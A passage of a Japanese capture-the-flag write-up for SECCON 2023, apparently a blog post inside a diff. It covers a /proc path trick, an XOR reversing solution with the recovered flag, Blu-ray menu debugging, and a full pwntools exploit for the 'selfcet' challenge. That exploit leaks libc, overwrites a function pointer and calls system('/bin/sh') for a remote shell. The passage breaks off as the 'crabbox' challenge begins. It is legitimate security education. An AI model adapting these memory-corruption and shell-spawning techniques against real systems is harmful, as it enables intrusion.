+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] No more fd trick ;)&#34;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(path), <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        print(f<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x100</span>))
+</span></span></code></pre></div><p><code>flag.txt</code>をメモリにマップした後、ファイル名に<code>flag.txt</code>と<code>fd</code>が含まれない任意のファイルの先頭256バイトを何度でも読みだせるプログラムを攻略する問題です。</p>
+<p><code>/proc/self</code>を悪用してくださいと言わんばかりな感じですが、<code>/proc/self/fd</code>は塞がれており、<code>/proc/self/map_files</code>を使おうにも、先頭256バイトしか読まないので<code>/proc/self/maps</code>ではflagの位置を特定できません。</p>
+<p>結局 Pythonの<code>os.path.realpath()</code>に途中の要素がディレクトリでなくてもエラーにならないという仕様があることに気づき、<code>/proc/self/fd/1</code>へのシンボリックリンクの <code>/dev/stdout</code>を使って <code>/dev/stdout/../5</code> を読ませて解きました。</p>
+<p>実は<code>/proc/self/auxv</code>や<code>/proc/self/syscall</code>で取れるアドレスとflagの相対位置は常に一定なので、これでアドレスを特定して<code>map_files</code>で読むのが想定解らしいです。</p>
+<p>exploit:</p>
+<pre tabindex="0"><code>/dev/stdout/../5
+</code></pre><h3 id="jumpout-reversing">jumpout (reversing)</h3>
+<p>難読化されたflag判定プログラムを解析してFlagを逆算する問題です。</p>
+<p>デバッガで処理追っていくと、まずFlagの長さが29文字であることを確認し、次に<code>Flag xor 文字のインデックス xor 0x55 xor 謎のデータ</code>の結果が<code>謎のデータその2</code>と一致すると正解になることが分かります。Flagのかわりに<code>謎のデータその2</code>とxorすればFlagが逆算できますね。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>v1 <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0x68</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0x09</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0xf1</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x81</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x17</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>v2 <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x0b</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x50</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x3f</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0xf3</span>,<span style="color:#ae81ff">0xc7</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xaa</span>,<span style="color:#ae81ff">0xb2</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0xb4</span>,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0x23</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x1d</span>):
+</span></span><span style="display:flex;"><span>    flag<span style="color:#f92672">.</span>append(chr(i <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x55</span> <span style="color:#f92672">^</span> v1[i] <span style="color:#f92672">^</span> v2[i]))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(flag))
+</span></span></code></pre></div><p><code>pwn.xor()</code>なる便利な関数がpwntoolsにあることを終了後に知りました。型からこちらの意図を察してよしなにやってくれるみたいです。賢い!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> xor(v1,v2,<span style="color:#ae81ff">0x55</span>,list(range(len(v1))))
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SECCON</span><span style="color:#e6db74">{jump_table_everywhere}</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p>実はわざわざ解析しなくてもangrに食わせれば一瞬で解けたらしいです。とくにソロプレイでは時間との戦いなので、こういう賢い解法をサッと思いつけるようになりたいですね。</p>
+<h3 id="perfect-blu-reversing">Perfect Blu (reversing)</h3>
+
+
+
+<div class="figure center nocaption" >
+  
+    <img class="fig-img" src="perfect-blu.jpg"  alt="Perfect Blu Screenshot">
+  
+  
+</div>
+
+<p>こんな感じのBlu-ray ディスクを解析してFlagを特定する問題です。</p>
+<p>Blu-ray ディスクのメニュー画面って仮想マシンで実装されているんですね。</p>
+<p>仕様を調べたところ、どうやら <code>/BDMV/MovieObject.bdmv</code>にプログラムが入っているようなので、まずパーサーを書こうとしたものの、うまく動かないし時間がかかりすぎるので断念しました。</p>
+<p><code>BD_DEBUG_MASK=0x10000 BD_DEBUG_FILE=/tmp/bd-debug vlc ISO</code> のようにしてlibblurayのデバッグを有効にしたVLCで弄ってみると、どうやら選択肢が正解のときは <code>1→2→3→...</code>のように順番にチャプターが遷移し、不正解のときは離れたチャプター番号に飛ばされることが分かりました。<br>
+これで選択した文字が正解か不正解か<strong>決定後</strong>に分かるようになったものの、不正解の後にモッサリ遅いBDのメニューで確定している部分を入力しなおすと時間がかかりすぎます。どうにかして決定前に遷移先を特定したい!</p>
+<p>libblurayのソースコードを調べると、<code>_user_input</code>でキー入力を受けとって選択したボタンのデータ <code>(BD_IG_BUTTON*)</code> を取得しており、そのデータの<code>-&gt;nav_cmds</code>に決定時に実行されるコードが記録されていることが分かります。</p>
+<p>あとはlibblurayをデバッグビルドし、</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nix" data-lang="nix"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> <span style="color:#f92672">import</span> <span style="color:#e6db74">&lt;nixpkgs&gt;</span> {}; <span style="color:#66d9ef">let</span>
+</span></span><span style="display:flex;"><span>  libbluray_ <span style="color:#f92672">=</span> enableDebugging libbluray;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">in</span>
+</span></span><span style="display:flex;"><span>  vlc<span style="color:#f92672">.</span>override {
+</span></span><span style="display:flex;"><span>    libbluray <span style="color:#f92672">=</span> libbluray_;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>gdbをアタッチしてこんな感じで遷移命令をダンプ</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">set follow-fork-mode parent
+set detach-on-fork on
+b *(_user_input+855)
+command 1
+silent
+p *(((BD_IG_BUTTON *)$rax)-&gt;nav_cmds+2)
+continue
+end
+</code></pre><p>これでボタンを選択した段階で正解・不正解が分かるようになったので、後はFlagを一文字づつ調べていくだけです。</p>
+<p>何で最初に動的解析せずにパーサーを書き始めて時間を無駄に浪費したんですかね。こういうのは、とても、良くない、ヘ タ ク ソ !!</p>
+<p>実はdiffで遷移先が特定できるらしいです。とくにソロプレイでは時間との戦いなので、こういう賢い解法をサッと思いつけるようになりたいですね (2回目)。
+<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">- Sickle: sys.audithookでpowが使われていそうなことがわかるので、pow関数をhookすると処理をエスパーできる<br>- Perfect Blu: vlcの出力を見るとチャプターでのオートマトンになってそう。(n).m2tsと(n+47).m2tsのdiffが1 bitしかなく、このアドレスが遷移先に該当している</p>&mdash; keymoon (@kymn_) <a href="https://twitter.com/kymn_/status/1703278268059979787?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</p>
+<p>想定解が気になる…</p>
+<h3 id="selfcet-pwning">selfcet (pwning)</h3>
+<p>問題:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define INSN_ENDBR64 (0xF30F1EFA) </span><span style="color:#75715e">/* endbr64 */</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CFI(f)                                              \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ({                                                        \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      __builtin_trap();                                     \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (f);                                                    \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  })
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define KEY_SIZE 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> key[KEY_SIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[KEY_SIZE];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>error;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> status;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>throw)(<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>, ...);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">ctx_t</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">read_member</span>(<span style="color:#66d9ef">ctx_t</span> <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">off_t</span> offset, <span style="color:#66d9ef">size_t</span> size) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">read</span>(STDIN_FILENO, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)ctx <span style="color:#f92672">+</span> offset, size) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    ctx<span style="color:#f92672">-&gt;</span>status <span style="color:#f92672">=</span> EXIT_FAILURE;
+</span></span><span style="display:flex;"><span>    ctx<span style="color:#f92672">-&gt;</span>error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;I/O Error&#34;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  ctx<span style="color:#f92672">-&gt;</span>buf[<span style="color:#a6e22e">strcspn</span>(ctx<span style="color:#f92672">-&gt;</span>buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (ctx<span style="color:#f92672">-&gt;</span>status <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CFI</span>(ctx<span style="color:#f92672">-&gt;</span>throw)(ctx<span style="color:#f92672">-&gt;</span>status <span style="color:#75715e">/* 32bit! */</span>, ctx<span style="color:#f92672">-&gt;</span>error);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(snip)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ctx_t</span> ctx <span style="color:#f92672">=</span> { .error <span style="color:#f92672">=</span> NULL, .status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, .throw <span style="color:#f92672">=</span> err };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_member</span>(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">ctx_t</span>, key), <span style="color:#66d9ef">sizeof</span>(ctx)); <span style="color:#75715e">/* ctx_t全体が書き換え可能 */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read_member</span>(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">ctx_t</span>, buf), <span style="color:#66d9ef">sizeof</span>(ctx)); <span style="color:#75715e">/* ctx_tのbuf以降全部が書き換え可能 &amp; スタックBOF */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  (snip)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Stack Smashing Protectorあり */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Full RELRO, NX, Stack Smashing Protectorあり, No PIEで、先頭が<code>endbr64</code>の関数を2回、それぞれ32bitと64bitの引数2個渡して実行でき、スタックバッファオーバーフローもあるプログラムを攻略する問題です。</p>
+<p>関数の初期値は<code>err()</code>で、第二引数のアドレスの内容をリークできますが途中で<code>exit()</code>してしまいます。しかし、実行環境(Ubuntu 22.04)のlibcは<code>err()</code>の近くにそれの<code>exit()</code>しないバージョンの<code>warnx()</code>があるので、関数ポインタを途中まで書き換えることでGOTをリークしてlibcのアドレスを特定できます。</p>
+<p>しかし、第一引数が32bitなので、<code>0xffffffff</code>以降に配置されているlibc内の<code>/bin/sh\0</code>を使ってお手軽に<code>system(&quot;/bin/sh&quot;)</code>することができません。<br>
+<code>endbr64</code>がない関数の途中を呼ばすこともできないので、うまくlibcを悪用してシェル実行に持ち込む必要があります。</p>
+<p>自分は<code>signal()</code>が都合のよい引数を持っていて<code>__stack_chk_fail</code>が<code>SIGABRT</code>で自殺することを利用して<code>signal(SIGABRT, main)</code>で<code>main</code>に戻して解きましたが、これは想定解ではなく、</p>
+<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">pwn簡易writeup<br>rop-2.35: gadgetを使わないROP<br>blackout: string.gのinclude忘れで定義が壊れてコンパイル時にバグが埋め込まれる→memmemが32-bitのアドレスを返すので4GB allocすると壊れる<br>selfcet: arch_prctlでFSレジスタを書き換えてstack canaryを回避する</p>&mdash; pwnyaa (@pwnyaa) <a href="https://twitter.com/pwnyaa/status/1703283949328576549?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p><code>arch_prctl(ARCH_SET_FS)</code> でTLSを差し替えてcanaryチェックを回避するのが想定解らしいです。これならリーク→canary置き換え→バッファオーバーフローの1パスで行けますね。<br>
+しかし、<code>ld.so</code>がTLSをセットアップしていることを知っていたにもかかわらず、なぜか同じ方法で再設定する発想に至れてませんでした… こういうのよくないですね。</p>
+<p>exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>   warnx_l16 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0010</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> i
+</span></span><span style="display:flex;"><span>   print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;trying: </span><span style="color:#e6db74">{</span>warnx_l16<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># r = process(&#34;./xor&#34;, env={&#34;LD_LIBRARY_PATH&#34;: os.getcwd()})</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># input()</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e"># warnx_l16 = 0x1010</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;selfcet.seccon.games&#34;</span>, <span style="color:#ae81ff">9999</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">#key</span>
+</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
+</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># error (arg2)</span>
+</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x403ff8</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit #err@got</span>
+</span></span><span style="display:flex;"><span>   buf <span style="color:#f92672">+=</span> p16(warnx_l16) <span style="color:#75715e">#warnx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   r<span style="color:#f92672">.</span>send(buf)
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>      print(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;xor: &#34;</span>))
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>      r<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: Success</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: Success</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>err <span style="color:#f92672">=</span> u64(a)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;err=</span><span style="color:#e6db74">{</span>err<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> err <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;err&#34;</span>]
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;base=</span><span style="color:#e6db74">{</span>base<span style="color:#e6db74">:</span><span style="color:#e6db74">x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>signal  <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;signal&#34;</span>]
+</span></span><span style="display:flex;"><span>gets <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;gets&#34;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401209</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
+</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> p64(main) <span style="color:#75715e"># error (arg2)</span>
+</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">6</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit, SIGABRT</span>
+</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> p64(signal)
+</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">#overflow</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(buf2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x20</span>))
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e">#key</span>
+</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
+</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># error (arg2)</span>
+</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404000</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit</span>
+</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">+=</span> p64(gets)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(buf3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>) <span style="color:#75715e">#🤢</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">#buf</span>
+</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># error (arg2)</span>
+</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x404000</span>) <span style="color:#75715e"># status (arg1) != 0, 32bit, &#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">+=</span> p64(system)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(buf4)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><code>mprotect()</code>してシェルコード実行に持ち込む、<code>on_exit()</code>で<code>main()</code>に戻すなどの方法もあったみたいです。
+<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">俺はmprotect+read</p>&mdash; LFT | 小池悠生 (@shojin_comp) <a href="https://twitter.com/shojin_comp/status/1703306637300417000?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">オジサンはwarn-&gt;on_exit-&gt;main-&gt;gets-&gt;system</p>&mdash; mora (@moratorium08) <a href="https://twitter.com/moratorium08/status/1703332110596227311?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</p>
+<h3 id="crabbox-misc">crabbox (misc)</h3>
+<p>問題:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
